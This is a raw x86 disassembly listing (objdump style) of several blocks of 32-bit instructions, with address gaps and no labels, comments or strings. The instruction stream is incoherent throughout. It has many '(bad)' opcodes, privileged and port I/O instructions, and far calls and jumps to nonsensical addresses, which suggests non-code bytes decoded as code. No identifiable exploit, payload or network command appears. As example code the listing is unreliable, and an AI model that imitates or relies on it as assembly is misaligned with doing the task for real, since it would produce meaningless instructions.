  42e68b:	mov    ds:0xe3c0a01f,eax
  42e690:	push   ss
  42e691:	shl    ebp,0x5f
  42e694:	dec    ecx
  42e695:	inc    ecx
  42e696:	jmp    0xb7248a0f
  42e69b:	cmp    DWORD PTR [ebx-0x10],esp
  42e69e:	outs   dx,BYTE PTR ds:[esi]
  42e69f:	pop    ebp
  42e6a0:	add    eax,0x4393eb67
  42e6a5:	sub    DWORD PTR [edi-0x191c9e09],edi
  42e6ab:	loopne 0x42e65f
  42e6ad:	mov    al,ds:0x779bf718
  42e6b2:	push   esp
  42e6b3:	pop    ecx
  42e6b4:	dec    edi
  42e6b5:	mov    dh,0x93
  42e6b7:	mov    bl,0x6b
  42e6b9:	mov    ebx,0x88a89616
  42e6be:	lods   al,BYTE PTR ds:[esi]
  42e6bf:	dec    edi
  42e6c0:	nop
  42e6c1:	mov    ds:0x97ad5e04,eax
  42e6c6:	mov    ch,0x1a
  42e6c8:	pop    eax
  42e6c9:	jae    0x42e6d4
  42e6cb:	nop
  42e6cc:	imul   edx,DWORD PTR [edi],0xe62885d6
  42e6d2:	sbb    eax,0x1b760d2
  42e6d7:	scas   eax,DWORD PTR es:[edi]
  42e6d8:	es push eax
  42e6da:	idiv   BYTE PTR [esi+0x75]
  42e6dd:	cdq    
  42e6de:	inc    esi
  42e6df:	lahf   
  42e6e0:	adc    cl,bl
  42e6e2:	cdq    
  42e6e3:	sub    eax,0x3f3b2fdc
  42e6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6e9:	cmp    DWORD PTR ds:0x618b41b8,0x36
  42e6f0:	(bad)  
  42e6f1:	jecxz  0x42e6bb
  42e6f3:	add    al,0xf9
  42e6f5:	add    al,0xeb
  42e6f7:	mov    edx,DWORD PTR [ebx+0x15]
  42e6fa:	mov    dl,0x32
  42e6fc:	push   esi
  42e6fd:	inc    esi
  42e6fe:	int3   
  42e6ff:	xchg   ebp,eax
  42e700:	xchg   ebp,eax
  42e701:	mov    ds:0xeabd2985,eax
  42e706:	aas    
  42e707:	inc    esi
  42e708:	push   esp
  42e709:	or     BYTE PTR [ecx],dh
  42e70b:	mov    edi,0xf4e388d3
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fcmovb st,st(0)
  42e781:	jne    0x42e752
  42e783:	loop   0x42e7cd
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	loopne 0x42e7e4
  42e78e:	or     al,0x71
  42e790:	dec    edx
  42e791:	mov    esi,0xa63b806b
  42e796:	cld    
  42e797:	(bad)  
  42e798:	dec    BYTE PTR [ebx+ebp*2-0x4]
  42e79c:	mov    edi,0xce2f8a29
  42e7a1:	retf   
  42e7a2:	adc    edx,ebp
  42e7a4:	jmp    0xc0092071
  42e7a9:	and    al,0x4b
  42e7ab:	in     al,dx
  42e7ac:	sub    DWORD PTR [esi-0xc08fe4a],esp
  42e7b2:	je     0x42e7c3
  42e7b4:	add    ch,bl
  42e7b6:	call   0xe20e:0x9e36a0fa
  42e7bd:	inc    eax
  42e7be:	cld    
  42e7bf:	mov    WORD PTR [ecx],?
  42e7c1:	adc    al,0xdb
  42e7c3:	push   0xffffffe4
  42e7c5:	jb     0x42e761
  42e7c7:	add    DWORD PTR ds:0xfa82dec7,esp
  42e7cd:	inc    edx
  42e7ce:	cmp    ah,ch
  42e7d0:	lock push esp
  42e7d2:	mov    WORD PTR [eax],ds
  42e7d4:	mov    BYTE PTR ss:[ebp-0x3e],dl
  42e7d8:	test   al,0x21
  42e7da:	scas   eax,DWORD PTR es:[edi]
  42e7db:	lock cmp BYTE PTR [esi+0x7b],0x7c
  42e7e0:	test   edx,ecx
  42e7e2:	loop   0x42e798
  42e7e4:	xchg   edx,eax
  42e7e5:	jb     0x42e7c9
  42e7e7:	pusha  
  42e7e8:	aas    
  42e7e9:	adc    eax,0x27bdf2fc
  42e7ee:	inc    eax
  42e7ef:	adc    BYTE PTR [eax-0x7d],cl
  42e7f2:	add    ah,BYTE PTR [eax-0x42610a86]
  42e7f8:	(bad)  
  42e7f9:	shl    DWORD PTR [edi+0x1c3ff2cc],cl
  42e7ff:	sbb    DWORD PTR [eax],ebp
  42e801:	imul   ebp,edx,0x12
  42e804:	xchg   esi,eax
  42e805:	fist   WORD PTR [ebx+eax*8+0x2698d2f4]
  42e80c:	push   esi
  42e80d:	mov    BYTE PTR [edx-0x5a],bl
  42e810:	jbe    0x42e856
  42e812:	loope  0x42e82c
  42e814:	jmp    0x84b6a484
  42e819:	adc    DWORD PTR [edi+0x5],0xffffffbf
  42e81d:	out    dx,eax
  42e81e:	arpl   WORD PTR fs:[edx-0x56],ax
  42e822:	xor    DWORD PTR [eax],esp
  42e824:	(bad)  
  42e825:	sti    
  42e826:	sub    ch,BYTE PTR [eax+0x56024d3d]
  42e82c:	dec    ebx
  42e82d:	loope  0x42e84d
  42e82f:	out    dx,al
  42e830:	(bad)  
  42e831:	ins    DWORD PTR es:[edi],dx
  42e832:	stc    
  42e833:	les    esp,FWORD PTR [esi+0x7e39fe45]
  42e839:	lock mov eax,0x2eff7bb0
  42e83f:	enter  0x7abf,0x57
  42e843:	mov    WORD PTR [edx+0x2c106d58],es
  42e849:	ret    
  42e84a:	pop    es
  42e84b:	sub    BYTE PTR [ebx],dh
  42e84d:	adc    ecx,ebx
  42e84f:	call   0x5ee0:0x236c6c11
  42e856:	jp     0x42e8be
  42e858:	out    0xce,eax
  42e85a:	or     ch,ah
  42e85c:	mov    esi,0x10d738ec
  42e861:	pop    ss
  42e862:	jae    0x42e8ab
  42e864:	adc    esp,DWORD PTR [esp+ebp*1+0x317ac4e6]
  42e86b:	jae    0x42e87c
  42e86d:	test   al,0xa0
  42e86f:	dec    eax
  42e870:	fs push ebx
  42e872:	(bad)  
  42e873:	sub    eax,0x4f5fda11
  42e878:	dec    ecx
  42e879:	add    ecx,DWORD PTR [eax-0x2b310019]
  42e87f:	jns    0x42e804
  42e881:	lahf   
  42e882:	sbb    eax,0xe198459a
  42e887:	or     ebx,edi
  42e889:	pop    esi
  42e88a:	ds or  eax,0x417b87f9
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x5fdc07d5]
  42e901:	out    0xec,al
  42e903:	(bad)  
  42e904:	dec    esp
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	lock mov DWORD PTR [esi+0x78],esp
  42e910:	jbe    0x42e98a
  42e912:	push   eax
  42e913:	mov    bh,0x56
  42e915:	and    WORD PTR [esi+0x66c9a410],si
  42e91c:	inc    eax
  42e91d:	pop    esi
  42e91e:	int3   
  42e91f:	mov    ebp,0x92e14780
  42e924:	dec    ebp
  42e925:	fidiv  DWORD PTR [ebx+0xdfc6e0a]
  42e92b:	call   0x24e8:0x21a3cd2b
  42e932:	jecxz  0x42e902
  42e934:	ja     0x42e99b
  42e936:	lds    eax,FWORD PTR [eax-0x38948938]
  42e93c:	or     eax,0xbf45afcb
  42e941:	data16 cmp al,0x31
  42e944:	push   cs
  42e945:	pop    eax
  42e946:	cmp    cl,al
  42e948:	pop    edx
  42e949:	lahf   
  42e94a:	ds push ds
  42e94c:	jle    0x42e9c3
  42e94e:	mov    al,ds:0xe1b7415
  42e953:	inc    eax
  42e954:	jmp    0x42e93f
  42e956:	into   
  42e957:	pop    ecx
  42e958:	and    ah,dl
  42e95a:	loope  0x42e9d1
  42e95c:	ss test al,0x45
  42e95f:	xlat   BYTE PTR ds:[ebx]
  42e960:	jno    0x42e9d4
  42e962:	sbb    esp,DWORD PTR [ebp+0x26271c84]
  42e968:	and    edi,esi
  42e96a:	daa    
  42e96b:	inc    ecx
  42e96c:	pop    ebx
  42e96d:	je     0x42e935
  42e96f:	pop    eax
  42e970:	leave  
  42e971:	push   ecx
  42e972:	jmp    0x2490c7d9
  42e977:	fild   WORD PTR [esi+0x33]
  42e97a:	cld    
  42e97b:	xor    bl,BYTE PTR [ebx-0x7c]
  42e97e:	fisubr WORD PTR [esi]
  42e980:	push   DWORD PTR [esi]
  42e982:	dec    ah
  42e984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e985:	mov    al,ds:0xd7ff512c
  42e98a:	jbe    0x42e977
  42e98c:	mov    eax,ds:0x86f185c0
  42e991:	jb     0x42e93d
  42e993:	jb     0x42e970
  42e995:	imul   esp,DWORD PTR [edx+0x60fee0dc],0x46
  42e99c:	dec    eax
  42e99d:	rcl    BYTE PTR [ebx+0x33],0xfa
  42e9a1:	subps  xmm7,XMMWORD PTR [edx]
  42e9a4:	aas    
  42e9a5:	lea    ebx,[ebx+ebx*4]
  42e9a8:	jp     0x42e944
  42e9aa:	(bad)  
  42e9ab:	dec    edi
  42e9ac:	sub    DWORD PTR [ebx+esi*1-0x64],ecx
  42e9b0:	mov    edx,0xb3528684
  42e9b5:	mov    al,0x43
  42e9b7:	mov    eax,ds:0x6ba6644d
  42e9bc:	leave  
  42e9bd:	lods   al,BYTE PTR ds:[esi]
  42e9be:	and    BYTE PTR [ebx+eiz*1-0x59cb3238],bh
  42e9c5:	mov    al,ds:0x882ae073
  42e9ca:	jge    0xff9a2bab
  42e9d0:	mov    esi,0x86ded1b
  42e9d5:	(bad)  
  42e9d6:	push   0x40564ac1
  42e9db:	sub    al,0x74
  42e9dd:	test   al,0x70
  42e9df:	(bad)  
  42e9e0:	jge    0x42e9d8
  42e9e2:	mov    ds:0xaf5887d5,al
  42e9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9e8:	jp     0x42ea5d
  42e9ea:	ins    BYTE PTR es:[edi],dx
  42e9eb:	clc    
  42e9ec:	lahf   
  42e9ed:	stos   BYTE PTR es:[edi],al
  42e9ee:	scas   eax,DWORD PTR es:[edi]
  42e9ef:	adc    al,0x6c
  42e9f1:	loopne 0x42e9d5
  42e9f3:	adc    DWORD PTR [ebp+ecx*2-0x7ac1bdce],0x13
  42e9fb:	loope  0x42ea30
  42e9fd:	mov    cl,0xaa
  42e9ff:	mov    WORD PTR [edi-0xd29bf1f],gs
  42ea05:	push   ebp
  42ea06:	push   eax
  42ea07:	cmp    cl,ch
  42ea09:	pop    eax
  42ea0a:	or     al,0x14
  42ea0c:	sbb    bh,BYTE PTR [eax+0x71]
  42ea0f:	mov    ebx,0x0
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	or     eax,0x504d0146
  42ea85:	repz add DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	push   0xffffffcc
  42ea8e:	xchg   edi,eax
  42ea8f:	out    dx,al
  42ea90:	test   eax,0x9e434fee
  42ea95:	pop    ds
  42ea96:	and    eax,DWORD PTR [eax-0x10]
  42ea99:	lea    edx,[edi+0x4078abe4]
  42ea9f:	jge    0x42eb1b
  42eaa1:	push   edi
  42eaa2:	es add ch,bl
  42eaa5:	loopne 0x42ea86
  42eaa7:	or     BYTE PTR [ecx-0x4e64ac7a],ah
  42eaad:	mov    dl,0x40
  42eaaf:	adc    DWORD PTR [edx+edx*8],ebx
  42eab2:	sti    
  42eab3:	inc    ebx
  42eab4:	pop    ds
  42eab5:	rcl    BYTE PTR [ebx-0x352dcbba],0xa5
  42eabc:	mov    ebp,DWORD PTR [ecx]
  42eabe:	jb     0x42eb33
  42eac0:	rol    cl,0x76
  42eac3:	aaa    
  42eac4:	cmp    eax,0xb3a9ff48
  42eac9:	sti    
  42eaca:	popf   
  42eacb:	mov    ah,0xbd
  42eacd:	cmp    eax,0x9987f7b1
  42ead2:	cdq    
  42ead3:	push   ds
  42ead4:	fistp  DWORD PTR [edi-0x2a]
  42ead7:	int    0xe1
  42ead9:	ja     0x42eb47
  42eadb:	mov    WORD PTR [ecx+ebp*8+0x7091903b],es
  42eae2:	retf   
  42eae3:	add    DWORD PTR [ecx+0x605f7077],esi
  42eae9:	jl     0x42eb47
  42eaeb:	mov    ds:0xbde262fd,eax
  42eaf0:	cli    
  42eaf1:	jne    0x42eb0f
  42eaf3:	out    0x92,al
  42eaf5:	stos   DWORD PTR es:[edi],eax
  42eaf6:	push   cs
  42eaf7:	xor    ah,BYTE PTR [esp+ebx*2+0x1eed27f4]
  42eafe:	cmp    eax,0x8ea7ee29
  42eb03:	push   0x1
  42eb05:	pop    ecx
  42eb06:	xchg   DWORD PTR [edx-0x30],edx
  42eb09:	xchg   BYTE PTR [ebx+ecx*8+0x72b24214],ah
  42eb10:	je     0x42eac2
  42eb12:	adc    al,0x2
  42eb14:	mov    ah,0x9
  42eb16:	or     DWORD PTR [esp+ebx*2-0x30],ebx
  42eb1a:	(bad)  
  42eb1b:	test   dl,0xa6
  42eb1e:	sub    bl,BYTE PTR [edi-0x1af670ff]
  42eb24:	and    DWORD PTR [eax+0x4a0c6ac3],esp
  42eb2a:	out    0xc8,eax
  42eb2c:	imul   esp,DWORD PTR [eax-0x53],0xd5388d11
  42eb33:	inc    edx
  42eb34:	fmul   DWORD PTR [ebp+0x203bb638]
  42eb3a:	sbb    BYTE PTR [ecx+edx*4-0x6acd1882],bh
  42eb41:	loop   0x42eb6c
  42eb43:	and    dh,ah
  42eb45:	rol    DWORD PTR [eax+0x2c],cl
  42eb48:	lds    eax,FWORD PTR [edx+ebx*4+0x59805378]
  42eb4f:	jmp    0xde0:0x28305201
  42eb56:	push   es
  42eb57:	adc    DWORD PTR [ecx+0x64],0xffffff99
  42eb5b:	(bad)  
  42eb5c:	loope  0x42eb31
  42eb5e:	jo     0x42eb2a
  42eb60:	sbb    esp,DWORD PTR [edx*8-0x4c2144af]
  42eb67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb68:	jp     0x42eb18
  42eb6a:	fld    TBYTE PTR ds:0x2d794622
  42eb70:	mov    DWORD PTR [esi-0x3a],edx
  42eb73:	and    BYTE PTR [ebx-0x6f],bh
  42eb76:	xchg   esi,eax
  42eb77:	in     eax,0x95
  42eb79:	mov    eax,0x4178dc03
  42eb7e:	cs jl  0x42ebe8
  42eb81:	dec    ecx
  42eb82:	or     al,0xb
  42eb84:	aaa    
  42eb85:	xchg   esp,ebx
  42eb87:	sub    BYTE PTR [ebx-0x7e30497d],0x47
  42eb8e:	in     eax,0x80
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	add    DWORD PTR [ebx+0x54308146],0x40001f4
  42ec09:	add    DWORD PTR [eax],eax
  42ec0b:	add    BYTE PTR [edx-0x6f],dh
  42ec0e:	push   ss
  42ec0f:	mov    al,ds:0x3e37b2f0
  42ec14:	sti    
  42ec15:	call   0xa058:0x143a57d9
  42ec1c:	push   esp
  42ec1d:	jmpw   0x1a27
  42ec21:	add    BYTE PTR ds:0x7dff4cae,ah
  42ec27:	inc    esi
  42ec28:	or     BYTE PTR [edx+0x14551716],0x29
  42ec2f:	fcmovnu st,st(6)
  42ec31:	sub    bl,BYTE PTR [ecx+0x532b63c1]
  42ec37:	jle    0x42eca1
  42ec39:	adc    al,0x41
  42ec3b:	leave  
  42ec3c:	mov    WORD PTR [ebp-0xa],ss
  42ec3f:	inc    edi
  42ec40:	ror    BYTE PTR ss:[edi+0x2a0a52be],0x5e
  42ec48:	shl    BYTE PTR [ecx],cl
  42ec4a:	fmul   st,st(5)
  42ec4c:	leave  
  42ec4d:	xchg   ecx,eax
  42ec4e:	xchg   ecx,eax
  42ec4f:	or     eax,0xbc6c5b7a
  42ec54:	dec    ebp
  42ec55:	sbb    eax,edx
  42ec57:	add    DWORD PTR [edi-0x5a],esp
  42ec5a:	and    BYTE PTR [ecx],ah
  42ec5c:	xor    dl,BYTE PTR [eax+0x25b0f0dd]
  42ec62:	aad    0x28
  42ec64:	leave  
  42ec65:	mov    ds:0x7c19fc1b,eax
  42ec6a:	jne    0x42ec83
  42ec6c:	aad    0xdd
  42ec6e:	push   edi
  42ec6f:	mov    ecx,0xae1820b3
  42ec74:	ins    BYTE PTR es:[edi],dx
  42ec75:	push   0xfffffffe
  42ec77:	aaa    
  42ec78:	ja     0x42ec3a
  42ec7a:	clc    
  42ec7b:	xchg   ebx,eax
  42ec7c:	pop    edi
  42ec7d:	ror    BYTE PTR [edi],0xf2
  42ec80:	fcmovbe st,st(3)
  42ec82:	inc    ecx
  42ec83:	out    dx,eax
  42ec84:	fdiv   DWORD PTR [ebp+0x35]
  42ec87:	cwde   
  42ec88:	pushf  
  42ec89:	jmp    0x42ecf4
  42ec8b:	repnz imul edi,DWORD PTR [bx+si],0xffffff9c
  42ec90:	enter  0xad0e,0xe9
  42ec94:	dec    ebx
  42ec95:	pusha  
  42ec96:	ror    DWORD PTR [ebp-0x4dda36b2],1
  42ec9c:	adc    DWORD PTR [esi+ebx*2],ebx
  42ec9f:	sahf   
  42eca0:	xor    bl,BYTE PTR [esi+ebp*2]
  42eca3:	sbb    eax,0x67e036c1
  42eca8:	dec    ebp
  42eca9:	inc    esp
  42ecaa:	xor    eax,ecx
  42ecac:	adc    bh,BYTE PTR [ecx+0x6f0f4dd7]
  42ecb2:	jmp    0x42ed03
  42ecb4:	int    0x1e
  42ecb6:	and    BYTE PTR [esi-0x39],bl
  42ecb9:	dec    edi
  42ecba:	inc    esi
  42ecbb:	mov    esp,0x3054e3c1
  42ecc0:	test   BYTE PTR [edx-0x65ccb92d],0xe6
  42ecc7:	dec    eax
  42ecc8:	ins    BYTE PTR es:[edi],dx
  42ecc9:	(bad)  
  42ecca:	(bad)  [eax+0x449c41cd]
  42ecd0:	push   ebp
  42ecd1:	push   ss
  42ecd2:	scas   al,BYTE PTR es:[edi]
  42ecd3:	or     BYTE PTR [ebp+ebp*4-0x282c93ca],cl
  42ecda:	js     0x42ec7e
  42ecdc:	pop    ebp
  42ecdd:	xabort 0xd
  42ece0:	clc    
  42ece1:	sub    eax,0xf7588dc6
  42ece6:	push   ds
  42ece7:	mov    ah,0xe4
  42ece9:	std    
  42ecea:	push   ebx
  42eceb:	shr    BYTE PTR [esi],cl
  42eced:	xchg   BYTE PTR [ebp-0x38128cb7],dh
  42ecf3:	rcl    BYTE PTR [esi],1
  42ecf5:	mov    esp,0xf9178709
  42ecfa:	push   esi
  42ecfb:	xor    DWORD PTR [edx-0x1f8ec493],0x16b4ea
  42ed05:	and    al,0xb1
  42ed07:	xor    BYTE PTR [ecx+esi*8-0x3285c699],dl
  42ed0e:	retf   0xac
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x2db68d5e]
  42ed83:	sub    DWORD PTR [eax-0xb],ebx
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	(bad)  
  42ed8d:	sub    bh,BYTE PTR [eiz*1+0x5640bc05]
  42ed94:	mov    al,ds:0x2a7cdb80
  42ed99:	call   0xcd0770e6
  42ed9e:	jb     0x42eda9
  42eda0:	stos   DWORD PTR es:[edi],eax
  42eda1:	xchg   edi,eax
  42eda2:	cld    
  42eda3:	push   ebp
  42eda4:	ja     0x42ed5d
  42eda6:	shr    DWORD PTR [eax-0x64d9cd04],1
  42edac:	outs   dx,BYTE PTR ds:[esi]
  42edad:	iret   
  42edae:	pop    ecx
  42edaf:	and    al,0xa4
  42edb1:	jmp    0x56c1d42e
  42edb6:	push   eax
  42edb7:	lahf   
  42edb8:	aaa    
  42edb9:	(bad)  
  42edba:	adc    eax,edx
  42edbc:	loopne 0x42ee34
  42edbe:	push   cs
  42edbf:	xor    ebx,ebp
  42edc1:	pop    ebp
  42edc2:	mov    bh,0x63
  42edc4:	mov    al,0x7e
  42edc6:	jo     0x42ee3b
  42edc8:	mov    bl,0x52
  42edca:	lock pop dx
  42edcd:	jmp    0x42edc6
  42edcf:	xchg   esi,eax
  42edd0:	int3   
  42edd1:	dec    edi
  42edd2:	into   
  42edd3:	mov    ch,0xf4
  42edd5:	xchg   ebp,eax
  42edd6:	lods   al,BYTE PTR ds:[esi]
  42edd7:	out    0xf2,al
  42edd9:	out    dx,eax
  42edda:	jl     0x42ed6b
  42eddc:	mov    ch,0xe
  42edde:	mov    ecx,0x77dab0fd
  42ede3:	mov    ds:0x54d7b887,eax
  42ede8:	mov    ecx,0x8840378c
  42eded:	lea    esi,[ebx+ecx*8]
  42edf0:	push   edi
  42edf1:	pop    eax
  42edf2:	xchg   esi,eax
  42edf3:	adc    BYTE PTR [ebp+0x2],dl
  42edf6:	sub    DWORD PTR [ecx+0x64],esp
  42edf9:	ds sub eax,0x5d11d86a
  42edff:	aad    0x7b
  42ee01:	ret    0x5782
  42ee04:	sub    eax,0xeec515d2
  42ee09:	xchg   esp,eax
  42ee0a:	or     cl,ch
  42ee0c:	stc    
  42ee0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee0e:	adc    eax,0xf08e5bd2
  42ee13:	ins    BYTE PTR es:[edi],dx
  42ee14:	mov    WORD PTR [eax],?
  42ee16:	push   ecx
  42ee17:	inc    ebp
  42ee18:	and    BYTE PTR [edi-0x6655f45d],bl
  42ee1e:	or     eax,0xe619b406
  42ee23:	ja     0x42ee48
  42ee25:	jb     0x42eea3
  42ee27:	jnp    0x42ee44
  42ee29:	jp     0x42edd5
  42ee2b:	pop    ds
  42ee2c:	mov    bh,0x42
  42ee2e:	jno    0x42ee6d
  42ee30:	leave  
  42ee31:	sub    BYTE PTR [esi],ah
  42ee33:	jp     0x42eead
  42ee35:	stc    
  42ee36:	xchg   edx,eax
  42ee37:	dec    esi
  42ee38:	dec    edi
  42ee39:	lea    ecx,[bx]
  42ee3c:	mov    WORD PTR [esi+0x1f],ss
  42ee3f:	call   0xf380fec
  42ee44:	or     DWORD PTR [edx-0x62],ebx
  42ee47:	shl    bl,1
  42ee49:	jbe    0xe2c66f64
  42ee4f:	call   0x26c27d6d
  42ee54:	out    0xb3,al
  42ee56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee57:	lds    ebp,FWORD PTR [esi]
  42ee59:	inc    edi
  42ee5a:	mov    edx,0x98b9f616
  42ee5f:	push   es
  42ee60:	rcl    DWORD PTR [ecx+0x1196c9f4],1
  42ee66:	mov    eax,ds:0xb65da1d5
  42ee6b:	mov    ds:0xa87694ad,al
  42ee70:	pop    ds
  42ee71:	lock sbb ecx,DWORD PTR [edi+0x65]
  42ee75:	add    DWORD PTR [edi-0x6591a4fc],0x5c
  42ee7c:	(bad)  
  42ee7d:	loop   0x42ee70
  42ee7f:	cmp    ecx,edx
  42ee81:	xlat   BYTE PTR ds:[ebx]
  42ee82:	or     dl,BYTE PTR [ebp+eiz*1+0x62]
  42ee86:	rol    DWORD PTR [edi],cl
  42ee88:	arpl   WORD PTR [ecx-0x62a47403],di
  42ee8e:	sahf   
  42ee8f:	inc    ebp
	...
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	outs   dx,DWORD PTR ds:[esi]
  42ef01:	adc    dl,BYTE PTR [esi+0x1f65ca9]
  42ef07:	add    BYTE PTR [ecx+eax*1],al
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	fidivr DWORD PTR [ecx-0xaaaf833]
  42ef12:	data16 sbb BYTE PTR [ecx+0x24a1d9b6],0x54
  42ef1a:	push   esi
  42ef1b:	daa    
  42ef1c:	sub    eax,0x4a288444
  42ef21:	xor    DWORD PTR [eax],edx
  42ef23:	push   ax
  42ef25:	mov    gs,WORD PTR [edx-0x26]
  42ef28:	or     DWORD PTR [ebp-0x5],edx
  42ef2b:	les    esi,FWORD PTR [eax]
  42ef2d:	rol    bl,1
  42ef2f:	ins    DWORD PTR es:[edi],dx
  42ef30:	or     al,al
  42ef32:	mov    ds:0xef222a8c,al
  42ef37:	jo     0x42ef4b
  42ef39:	add    BYTE PTR [esi+0x38],ch
  42ef3c:	sar    BYTE PTR [eax],cl
  42ef3e:	es ins DWORD PTR es:[edi],dx
  42ef40:	cwde   
  42ef41:	mov    dl,0x42
  42ef43:	sahf   
  42ef44:	mov    edx,0xb5cb77fc
  42ef49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef4a:	std    
  42ef4b:	mov    ds:0x359baf64,al
  42ef50:	xor    BYTE PTR gs:[eax],0xda
  42ef54:	scas   al,BYTE PTR es:[edi]
  42ef55:	fwait
  42ef56:	xlat   BYTE PTR ds:[ebx]
  42ef57:	mov    WORD PTR [ecx+0x79],ds
  42ef5a:	push   edx
  42ef5b:	jle    0x42ef7e
  42ef5d:	pop    es
  42ef5e:	and    DWORD PTR [edx+ebp*4],0x18853684
  42ef65:	(bad)  
  42ef66:	mov    WORD PTR cs:[ebp+0x671f7a4],ss
  42ef6d:	into   
  42ef6e:	fsubr  DWORD PTR [ebx]
  42ef70:	add    ch,ch
  42ef72:	enter  0xcf4d,0xaa
  42ef76:	call   0xc23da850
  42ef7b:	dec    esp
  42ef7c:	ret    0xfc5d
  42ef7f:	out    0xf7,eax
  42ef81:	pop    eax
  42ef82:	xchg   DWORD PTR [ecx+0x68],eax
  42ef85:	out    dx,eax
  42ef86:	mov    ebx,0x3eeb68cd
  42ef8b:	sti    
  42ef8c:	and    al,0xeb
  42ef8e:	push   ds
  42ef8f:	adc    ch,BYTE PTR [edx-0x6d949305]
  42ef95:	out    dx,al
  42ef96:	sub    eax,0x725e0eaf
  42ef9b:	pop    ds
  42ef9c:	sub    al,0x16
  42ef9e:	mov    esp,0xd547a790
  42efa3:	jmp    0x3b7b0831
  42efa8:	neg    BYTE PTR [ecx+0x7478a7cb]
  42efae:	test   BYTE PTR [ecx],bh
  42efb0:	sbb    dh,BYTE PTR [edx+0x33621280]
  42efb6:	xor    eax,0x783c62e3
  42efbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efbc:	or     edx,0xa86b66e9
  42efc2:	adc    BYTE PTR [edx],0x23
  42efc5:	adc    al,0x50
  42efc7:	xor    eax,edx
  42efc9:	ds jmp 0x2d6042aa
  42efcf:	pushf  
  42efd0:	les    ebx,FWORD PTR [ebp+0x6e9ef7f4]
  42efd6:	fdiv   QWORD PTR [eax+eiz*2]
  42efd9:	(bad)  
  42efda:	xchg   ebp,eax
  42efdb:	inc    esp
  42efdc:	sub    ecx,DWORD PTR [ecx]
  42efde:	adc    BYTE PTR ds:0x11871103,bh
  42efe4:	imul   edi,edx,0xffffff8f
  42efe7:	xchg   DWORD PTR [edx+eiz*8+0x4bcd40e7],esi
  42efee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efef:	(bad)  
  42eff0:	sub    BYTE PTR [ebx],dl
  42eff2:	jo     0x42f060
  42eff4:	call   0xa7d1437e
  42eff9:	inc    edx
  42effa:	pop    edx
  42effb:	test   DWORD PTR [ebp+ebp*4+0x57cfb7c2],0x67f2ae49
  42f006:	in     eax,0x85
  42f008:	cdq    
  42f009:	(bad)  
  42f00a:	clc    
  42f00b:	push   0x60
  42f00d:	out    0x84,eax
  42f00f:	mov    BYTE PTR [eax],al
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	dec    eax
  42f081:	mov    dl,0xe3
  42f083:	jg     0x42f0e5
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    BYTE PTR [ebx],dl
  42f08d:	adc    dh,BYTE PTR [esi]
  42f08f:	cmp    dh,BYTE PTR ds:0xc4624d4f
  42f095:	push   ss
  42f096:	or     ecx,DWORD PTR [ebp-0x4a0dab76]
  42f09c:	int3   
  42f09d:	dec    eax
  42f09e:	bound  esp,QWORD PTR [eax]
  42f0a0:	mov    ecx,0x719f757e
  42f0a5:	loopne 0x42f0d0
  42f0a7:	mov    esi,0xb151e0a3
  42f0ac:	(bad)
  42f0af:	push   0x4c
  42f0b1:	cmp    ah,dl
  42f0b3:	les    edx,FWORD PTR ds:[edx+0x6c]
  42f0b7:	sbb    esp,DWORD PTR [esi+esi*2-0x3a]
  42f0bb:	jle    0x42f122
  42f0bd:	nop
  42f0be:	pop    edx
  42f0bf:	mov    esi,0x76614c37
  42f0c4:	clc    
  42f0c5:	push   0x78e63944
  42f0ca:	xchg   edx,eax
  42f0cb:	jns    0x42f11d
  42f0cd:	mov    DWORD PTR gs:[edx],edi
  42f0d0:	xor    BYTE PTR [esi-0x3b],0x76
  42f0d4:	push   cs
  42f0d5:	dec    eax
  42f0d6:	fadd   QWORD PTR [edi+0x5f]
  42f0d9:	js     0x42f09a
  42f0db:	jbe    0x42f117
  42f0dd:	mov    ds:0xcf80abab,al
  42f0e2:	sbb    BYTE PTR [edx],dh
  42f0e4:	xor    eax,0xa5c28474
